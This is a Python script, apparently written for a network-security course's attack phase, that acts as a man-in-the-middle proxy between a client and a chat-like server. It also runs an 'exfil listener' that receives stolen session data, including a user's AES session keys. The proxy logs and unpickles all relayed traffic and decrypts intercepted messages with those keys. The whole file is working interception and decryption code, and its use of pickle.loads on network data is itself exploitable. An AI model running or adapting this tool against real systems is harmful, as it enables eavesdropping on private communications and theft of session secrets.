import ast
import json
import pickle
import socket
import threading
import logging
from datetime import datetime
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend


logging.basicConfig(
    filename='/home/ritik/neu/ns-attack-phase/uppal-arjun/uppal/proxy_traffic.log',
    level=logging.INFO,
    format='%(asctime)s [%(threadName)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
)

session_data_store = None

def handle_exfil_connection(conn, addr):
    try:
        data = conn.recv(65535)
        global session_data_store
        session_data_store = json.loads(data.decode(), object_hook=convert_bytes)
        print(f"[!] Received session data from {addr}:")
        print(session_data_store)
        logging.info(data.decode())
    except Exception as e:
        print(f"[!] Exfil error from {addr}: {e}")
    finally:
        conn.close()

def start_exfil_listener(listen_port=7777):
    exfil_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    exfil_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    exfil_sock.bind(('0.0.0.0', listen_port))
    exfil_sock.listen(5)
    print(f"[*] Exfil listener running on port {listen_port}")

    while True:
        conn, addr = exfil_sock.accept()
        print(f"Connection from {addr}")
        threading.Thread(target=handle_exfil_connection, args=(conn, addr)).start()

def decrypt_data(data):
    match data[0]:
        case "LIST" | "LIST_RESPONSE" | "MSG_REQUEST" | "MSG_RESPONSE":
            print("dEcrypting Data")
            iv, ciphertext, _ = data[1]
            global session_data_store
            aes_key = session_data_store[0]['Alice']['session_keys'][0]
            decrypt(iv, aes_key, ciphertext)

def convert_bytes(obj):
    if isinstance(obj, str) and obj.startswith("b'") and obj.endswith("'"):
        try:
            return ast.literal_eval(obj)
        except (SyntaxError, ValueError):
            return obj
    elif isinstance(obj, list):
        return [convert_bytes(item) for item in obj]
    elif isinstance(obj, dict):
        return {k: convert_bytes(v) for k, v in obj.items()}
    elif isinstance(obj, tuple):
        return tuple(convert_bytes(item) for item in obj)
    return obj


def decrypt(iv, aes_key, ciphertext):
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(ciphertext) + decryptor.finalize()

    # Unpad
    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
    data = unpadder.update(padded_data) + unpadder.finalize()
    print(pickle.loads(data))

def forward(source, dest, label):
    while True:
        try:
            data = source.recv(65535)
            if not data:
                break
            logging.info(f"{label} {data.hex()}")
            incoming_data = pickle.loads(data)
            global session_data_store
            if session_data_store is not None and session_data_store[0].get('Alice'):
                decrypt_data(incoming_data)
            logging.info(data)
            dest.sendall(data)
        except Exception as e:
            logging.error(f"{label} forward error: {e}")
            source.close()
            dest.close()
            break

def handle_connection(client_socket, target_host, target_port):
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.connect((target_host, target_port))
        threading.Thread(target=forward, args=(client_socket, server_socket, 'C->S'), daemon=True).start()
        threading.Thread(target=forward, args=(server_socket, client_socket, 'S->C'), daemon=True).start()
    except Exception as e:
        logging.error(f"Connection handling error: {e}")

def start_proxy(listen_host, listen_port, target_host, target_port):
    try:
        proxy = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        proxy.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        proxy.bind((listen_host, listen_port))
        proxy.listen(5)
        print(f"[*] Proxy listening on {listen_host}:{listen_port} -> {target_host}:{target_port}")
        logging.info(f"[*] Proxy listening on {listen_host}:{listen_port} -> {target_host}:{target_port}")

        while True:
            client_conn, addr = proxy.accept()
            logging.info(f"[*] Accepted connection from {addr}")
            thread = threading.Thread(
                target=handle_connection,
                args=(client_conn, target_host, target_port),
                daemon=True
            )
            thread.start()
    except Exception as e:
        proxy.close()   

if __name__ == "__main__":
    # Change these as needed
    LISTEN_HOST = '0.0.0.0'
    LISTEN_PORT = 4444
    TARGET_HOST = '127.0.0.1'
    TARGET_PORT = 9090
    threading.Thread(target=start_exfil_listener, daemon=True).start()
    start_proxy(LISTEN_HOST, LISTEN_PORT, TARGET_HOST, TARGET_PORT)
    # Keep main thread alive
    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("\n[*] Proxy shutting down...")
